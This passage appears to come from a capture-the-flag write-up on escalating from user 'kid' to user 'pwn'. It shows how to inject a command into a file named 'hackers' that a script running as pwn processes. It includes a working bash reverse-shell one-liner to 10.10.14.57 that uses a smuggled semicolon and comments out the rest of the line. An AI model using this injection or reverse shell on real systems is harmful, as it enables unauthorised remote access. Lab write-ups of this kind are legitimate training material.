## For Root

On Enumerating I found this another user "pwn". <br>

Here we saw the script in the file hackers is being run as the user pwn. <br>
Here give two spaces before the actual code as the script removes the two spaces: `cut -d '  ' -f3- `.
And then comment the rest of the proceeding code. 
So for this, here is the rev shell exploit.
```bash
 echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.57/1234 0>&1' #" >> hackers
```

Run this script from the logs folder from kid's user.
